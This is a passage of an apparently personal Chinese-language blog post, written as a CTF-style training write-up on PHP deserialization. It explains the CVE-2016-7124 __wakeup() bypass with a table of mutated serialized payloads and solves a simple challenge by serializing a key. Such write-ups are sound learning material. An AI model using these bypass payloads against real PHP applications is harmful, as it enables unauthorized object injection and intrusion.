+<p>拿正常的序列化物件 <code>O:4:&quot;Flag&quot;:1:&#123;s:3:&quot;key&quot;;s:8:&quot;deadbeef&quot;;&#125;</code> 送回去會老實的觸發 <code>__wakeup()</code> 導致 flag 被覆寫得到 “You can not read the flag.”</p>
+<p>而 CVE-2016-7124 簡單來說就是當序列化物件中，物件的數量大於實際數量，就會因為系統處理不當無法解析此序列化物件而不執行 <code>__wakeup()</code></p>
+<p>以這題為例子</p>
+<table>
+<thead>
+<tr>
+<th align="left">Serialize</th>
+<th align="left">Bypass?1:0</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">O:4:”Flag”:1:{s:3:”key”;s:8:”deadbeef”;}</td>
+<td align="left">0</td>
+</tr>
+<tr>
+<td align="left">O:4:”Flag”:<font color="red">2</font>:{s:3:”key”;s:8:”deadbeef”;}</td>
+<td align="left">1</td>
+</tr>
+<tr>
+<td align="left">O:4:”Flag”:<font color="red">0</font>:{s:3:”key”;s:8:”deadbeef”;}</td>
+<td align="left">0</td>
+</tr>
+<tr>
+<td align="left">O:4:”Flag”:1:{s:<font color="red">4</font>:”key”;s:8:”deadbeef”;}</td>
+<td align="left">1</td>
+</tr>
+<tr>
+<td align="left">O:4:”Flag”:1:{s:<font color="red">2</font>:”key”;s:8:”deadbeef”;}</td>
+<td align="left">1</td>
+</tr>
+<tr>
+<td align="left">O:4:”Flag”:1:{s:3:”key”;s:<font color="red">7</font>:”deadbeef”;}</td>
+<td align="left">1</td>
+</tr>
+<tr>
+<td align="left">O:4:”Flag”:1:{s:3:”key”;s:<font color="red">9</font>:”deadbeef”;}</td>
+<td align="left">1</td>
+</tr>
+</tbody></table>
+<p>看到漏洞說明後，用表格中第二列的方式讓物件數量大於實際數量（實際只有一個字串，但我把它改成 2）就過了，接著又做了些測試，像是數量小於實際數量就不會過，但修改字串的長度或變數名稱的長度，無論是大於小於一樣都能在這題拿到 flag</p>
+<h3 id="Deserialization-01"><a href="#Deserialization-01" class="headerlink" title="Deserialization 01"></a>Deserialization 01</h3><p>前面都被 BOSS 霸凌完後回到人畜無害的第一題</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;N15RA&quot;</span>;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&quot;input&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(unserialize(<span class="variable">$input</span>) === <span class="variable">$key</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>exploit:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="string">&#x27;N15RA&#x27;</span>);</span><br><span class="line"><span class="comment">// s:5:&quot;N15RA&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>完工了~</p>
+<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>在一個跟 php 不熟（沒寫過也沒什麼在打 CTF）、但對序列化 / 反序列化有基礎理解的情況下，除了獲得很多提示，終於跟 php 混熟了點 (?)，耗了一整個下午，感覺學最多的是程式語言基礎，從物件導向開始（繼承、封裝、多型），到逃避了很久沒弄懂的 <code>$this</code> 感覺跟 python 的 <code>self</code>、java 的 <code>.this</code> 有異曲同工之妙，順便認識了 Magic Methods 等等，會寫在最後表示督促自己要乖乖生出下一篇筆記，也就是這一整下午撇除掉 php 反序列問題而習得的東西，如果這樣的預告最後還是沒生出文章的話…<br><strong><del>那我會回來把這段刪掉</del></strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Note/" rel="tag"># Note</a>
+              <a href="/tags/vulnerability/" rel="tag"># vulnerability</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/03/25/movie-3-hannibal/" rel="prev" title="Movie #3: Hannibal S2.EP11">
+      <i class="fa fa-chevron-left"></i> Movie #3: Hannibal S2.EP11
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/05/09/note-2-basic-oop/" rel="next" title="Note #2: 惡補物件導向基本知識">
+      Note #2: 惡補物件導向基本知識 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E5%B0%8E%E7%89%87"><span class="nav-number">1.</span> <span class="nav-text">前導片</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Serialize"><span class="nav-number">1.1.</span> <span class="nav-text">PHP Serialize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Serialize-Variable-Type"><span class="nav-number">1.2.</span> <span class="nav-text">Serialize Variable Type</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Magic-Methods-in-PHP-class"><span class="nav-number">1.3.</span> <span class="nav-text">Magic Methods in PHP class</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E7%89%87%E9%96%8B%E5%A7%8B"><span class="nav-number">2.</span> <span class="nav-text">正片開始</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Deserialization-05"><span class="nav-number">2.1.</span> <span class="nav-text">Deserialization 05</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deserialization-04"><span class="nav-number">2.2.</span> <span class="nav-text">Deserialization 04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deserialization-03"><span class="nav-number">2.3.</span> <span class="nav-text">Deserialization 03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deserialization-02"><span class="nav-number">2.4.</span> <span class="nav-text">Deserialization 02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deserialization-01"><span class="nav-number">2.5.</span> <span class="nav-text">Deserialization 01</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%A9%E8%9B%8B"><span class="nav-number">3.</span> <span class="nav-text">彩蛋</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Elmo Hsiao</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/amao1991" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;amao1991" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:elmo@elmo.tw" title="E-Mail → mailto:elmo@elmo.tw" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://instagram.com/elmootw" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;elmootw" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.behance.net/elmootw" title="Behance → https:&#x2F;&#x2F;www.behance.net&#x2F;elmootw" rel="noopener" target="_blank"><i class="fab fa-behance fa-fw"></i>Behance</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://elmootw.myportfolio.com/" title="https:&#x2F;&#x2F;elmootw.myportfolio.com&#x2F;" rel="noopener" target="_blank">Adobe Portfolio</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Elmo Hsiao</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://http-blog-amao-com-tw.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://blog.elmo.tw/2019/05/02/note-1-php-deserializtion-nisra-training/";
+    this.page.identifier = "2019/05/02/note-1-php-deserializtion-nisra-training/";
+    this.page.title = "Note #1: PHP Deserialization ";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://http-blog-amao-com-tw.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
